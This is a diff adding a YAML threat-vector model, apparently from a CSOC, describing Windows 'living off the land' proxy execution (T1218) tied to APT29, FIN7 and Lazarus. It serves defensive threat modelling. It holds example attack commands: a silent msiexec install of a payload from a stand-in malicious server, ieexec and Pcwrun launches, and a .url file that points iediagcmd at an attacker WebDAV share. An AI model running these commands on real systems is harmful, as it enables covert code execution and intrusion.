@@ -1,0 +1,148 @@
+name: Leverage Windows Utilities for Proxy Execution of Malicious Code
+criticality: Medium
+references:
+  public:
+    1: https://lolbas-project.github.io/
+    2: https://www.whitecloudsecurity.com/news/2025/June/Stealth-Falcon-Living-off-the-Land-Attack-Zero-Day/
+  #internal:
+    #a: 
+  #reports:
+    #-
+
+metadata:
+  uuid: 426a0ab5-66e7-4149-82b0-6357a1cf4b4b
+  schema: tvm::2.0
+  version: 1
+  created: 2024-11-04
+  modified: 2024-11-04
+  tlp: clear
+  organisation:
+    uuid: 56b0a0f0-b0bc-47d9-bb46-02f80ae2065a
+    name: EC DIGIT CSOC
+
+threat:
+  actors:
+    - name: att&ck::G0016 #[Enterprise] APT29, Blue Kitsune, Cozy Bear, CozyDuke, Dark Halo, IRON HEMLOCK, IRON RITUAL, Midnight Blizzard, NOBELIUM, NobleBaron, SolarStorm, The Dukes, UNC2452, UNC3524, YTTRIUM
+    - name: misp::2ee5ed7a-c4d0-40be-a837-20817474a15b #UNC2452, DarkHalo, StellarParticle, NOBELIUM, Solar Phoenix, Midnight Blizzard
+    - name: att&ck::G0046 #[Enterprise] FIN7, Carbon Spider, ELBRUS, GOLD NIAGARA, ITG14, Sangria Tempest
+    - name: misp::00220228-a5a4-4032-a30d-826bb55aa3fb #FIN7, CARBON SPIDER, GOLD NIAGARA, Calcium, ATK32, G0046, G0008, Coreid, Carbanak, Sangria Tempest, ELBRUS, Carbon Spider, JokerStash
+    - name: att&ck::G0082 #[Enterprise] APT38, BeagleBoyz, Bluenoroff, COPERNICIUM, NICKEL GLADSTONE, Sapphire Sleet, Stardust Chollima
+    - name: misp::68391641-859f-4a9a-9a1e-3e5cf71ec376 #Lazarus Group, Operation DarkSeoul, Dark Seoul, Hidden Cobra, Hastati Group, Andariel, Unit 121, Bureau 121, NewRomanic Cyber Army Team, Bluenoroff, Subgroup: Bluenoroff, Group 77, Labyrinth Chollima, Operation Troy, Operation GhostSecret, Operation AppleJeus, APT38, APT 38, Stardust Chollima, Whois Hacking Team, Zinc, Appleworm, Nickel Academy, APT-C-26, NICKEL GLADSTONE, COVELLITE, ATK3, G0032, ATK117, G0082, Citrine Sleet, DEV-0139, DEV-1222, Diamond Sleet, ZINC, Sapphire Sleet, COPERNICIUM, TA404, Lazarus group, BeagleBoyz
+  killchain: Execution
+  att&ck:
+    - T1218 #System Binary Proxy Execution
+  chaining:
+    - relation: atomicity::implements
+      vector: d5039f2c-9fcc-4ba3-ad6a-da8c891ba745
+      description: |
+        This TVM is implementing the bigger TVM : Abuse of Windows Utilities
+  #cve:
+    #-
+  #misp:
+    #-
+  domains:
+    - Enterprise
+  terrain: |
+    Threat actors must have access to a Windows system with user-level privileges 
+    where Windows utilities are available.
+  targets:
+    - Workstations
+    - Laptop
+    - Virtual Machines
+    - Public-Facing Servers
+  platforms:
+    - Windows
+  severity: Significant incident
+  leverage:
+    - Elevation of privilege
+    - Tampering
+    - Information Disclosure
+  impact:
+    - Data Breach
+    - Business disruption
+    - Reputational Damages
+  viability: Likely
+  description: |
+    Threat actors frequently exploit legitimate Windows utilities to execute malicious 
+    code covertly, a technique known as "Living off the Land" (LotL). 
+    By using trusted system binaries, attackers can bypass security measures that focus 
+    on untrusted or unusual processes, thereby reducing the likelihood of detection.
+
+    ### 1. Ieexec.exe
+
+    **Description**: A utility that executes .NET programs. Threat actors can use ieexec.exe 
+    to run malicious executables under the guise of Internet Explorer components.
+
+    Example:
+
+    ```
+    ieexec.exe C:\path\to\malicious.exe
+    ```
+    
+    ### 2. Ie4uinit.exe
+    
+    **Description**: Initializes user-specific settings for Internet Explorer. 
+    Can be misused to execute INF files.
+
+    Example:
+
+    ```
+    ie4uinit.exe -UserIconConfig
+    ```
+
+    ### 3. Msiexec.exe
+
+    **Description**: Used for installing, modifying, and performing operations 
+    on Windows Installer packages. Threat actors can execute malicious MSI packages or scripts.
+
+    Example:
+
+    ```
+    msiexec.exe /q /i http://malicious-server/payload.msi
+    ```
+
+    ### 4. Pcwrun.exe
+
+    **Description**: Part of the Performance Counters for Windows. 
+    It can be exploited to run scripts or executables under certain conditions.
+
+    Example:
+
+    ```
+    Pcwrun.exe /../../$(calc).exe
+    ```
+
+    ### 5. DevToolsLauncher.exe
+
+    **Description**: Associated with Visual Studio development tools. 
+    It can be abused to execute code or scripts in the context of development environments.
+
+    Example:
+
+    > Execute any binary with given arguments and it will call developertoolssvc.exe. 
+    developertoolssvc is actually executing the binary.
+
+    ```
+    devtoolslauncher.exe LaunchForDeploy [PATH_TO_BIN] "argument here" test
+    ```
+
+    ### 6. Iediagcmd.exe
+
+    **Description**: Diagnostics Utility for Internet Explorer
+    It can be used to execute binary pre-planted.
+
+    Example:
+
+    A .url file is sent to the victim or planted on disk.
+    It sets the WorkingDirectory to \\attacker.webdav.server\share
+    iediagcmd.exe tries to launch other tools like route.exe, 
+    netsh.exe, or CustomShellHost.exe.
+    
+    ```
+    [InternetShortcut]
+    URL=C:\\Program Files\\Internet Explorer\\iediagcmd.exe
+    WorkingDirectory=\\\\192.168.8.200@80\\payload
+    IconFile=C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe
+    IconIndex=13
+    ShowCommand=7
+    ```
